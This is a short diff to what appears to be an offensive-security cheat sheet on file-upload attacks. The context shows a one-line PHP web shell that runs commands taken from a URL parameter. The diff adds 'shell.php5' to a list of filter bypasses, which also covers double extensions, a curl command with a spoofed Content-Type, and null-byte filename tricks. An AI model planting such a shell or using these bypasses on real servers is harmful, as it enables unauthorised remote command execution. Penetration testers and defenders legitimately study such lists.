@@ -9,7 +9,7 @@
     <?php system($_GET['cmd']);?>
     ```
 - Bypass techniques:
-  - Change `shell.php` to `shell.php.jpg`
+  - Change `shell.php` to `shell.php.jpg` or `shell.php5`
   - Content-Type spoofing: `curl -F "file=@shell.php;type=image/jpeg"`
     > Change "file" if needed
   - NULL BYTE and Weird suffixes: `shell.php;.jpg`, `shell.php%20`, `shell.php%00.jpg`
